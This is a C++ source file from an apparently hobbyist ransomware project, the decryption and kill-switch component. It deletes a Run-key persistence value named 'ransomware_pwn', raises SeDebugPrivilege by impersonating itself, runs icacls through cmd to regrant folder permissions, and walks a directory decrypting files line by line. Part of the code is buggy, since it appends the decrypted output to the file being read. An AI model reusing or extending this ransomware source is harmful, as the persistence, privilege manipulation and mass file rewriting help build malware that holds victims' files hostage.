#include "kill_switch.h"
#include "cipher.h"

vector<wstring> decrypt_files(wstring path)
{
	// kill persistence value
	HKEY hKey;
	LONG oresult = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &hKey);
	if (oresult == ERROR_SUCCESS)
	{
		RegDeleteValue(hKey, L"ransomware_pwn");
		RegCloseKey(hKey);
	}
	else {
		std::cout << "RegDelete Error: " << GetLastError() << std::endl;
	}

	// Restore user privileges for files
	GetPrivsnDelete();

	// Enumerate through directory and decrypt line by line, file by file.
	vector<wstring> subdirs, matches;
	WIN32_FIND_DATA ffd;
	HANDLE hFind = FindFirstFile((_T(path) + L"\\*.*").c_str(), &ffd);

	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {
			wstring filename = _T(ffd.cFileName);
			if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				wstring file_path = path + L"\\" + filename;
				matches.push_back(file_path);

				std::wcout << "Decrypting file: " << filename << std::endl;

				// open file for writing
				std::ofstream outfile;
				if (outfile.fail())
				{
					std::wcout << "Can't open file " << filename << "!" << std::endl;
				}
				else {
					string readout;
					string decrypted_text;

					// for read
					ifstream file_read(file_path);
					// for write
					outfile.open(file_path, std::ios::in | ::ios::out | std::ios::app);
					while (getline(file_read, readout))
					{
						// Decrypt each word
						string key = generateKey(readout, keyword);
						decrypted_text = decryptText(readout, key);
						std::cout << "Decrypted Text: " << decrypted_text << std::endl;
						// append replaced strings to file
						outfile << decrypted_text + "\n";
						decrypted_text.clear();
					}

					// close files
					file_read.close();
					outfile.close();
				}
			}
		} while (FindNextFile(hFind, &ffd) != 0);
	}
	else {
		std::cout << "Can't find files in directory" << std::endl;
	}
	FindClose(hFind);

	// TODO: Replace file extensions to a signature .txt->.w4nnacry
	// TODO: Delete persistance file created
	return matches;
}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp = { 0 };
	// init all to zero
	LUID luid;
	DWORD cb = sizeof(TOKEN_PRIVILEGES);

	if (!LookupPrivilegeValue(NULL, Privilege, &luid))
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;

	if (bEnablePrivilege)
	{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else {
		tp.Privileges[0].Attributes = 0;
	}

	AdjustTokenPrivileges(hToken, FALSE, &tp, cb, NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		return FALSE;
	}

	return TRUE;
}

// This will try to run as admin if local user hasn't been configed properly
void GetPrivsnDelete()
{
	// now set privs back to ransomware, so we can delete and edit our own files
	HANDLE hToken;

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
	{
		if (GetLastError() == ERROR_NO_TOKEN)
		{
			if (!ImpersonateSelf(SecurityImpersonation))
			{
				std::cout << "Impersonate Error: " << GetLastError() << std::endl;
			}

			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
			{
				std::cout << "OpenThread Error: " << GetLastError() << std::endl;
			}
		}
		else {
			std::cout << "OpenThreadToken Error: " << GetLastError() << std::endl;
		}
	}

	if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
	{
		std::cout << "SetPriv Error: " << GetLastError() << std::endl;

		CloseHandle(hToken);
	}
	else {
		// grant privs back to whole folders
		ShellExecute(NULL,
			NULL,
			L"cmd",
			L"/k icacls ..\\..\\test_attack_folder\\* /grant \"everyone\":(IO)(CI)M",
			0,
			SW_NORMAL
		);
	}

	// disable SeDebugPriv
	SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);

	CloseHandle(hToken);
}
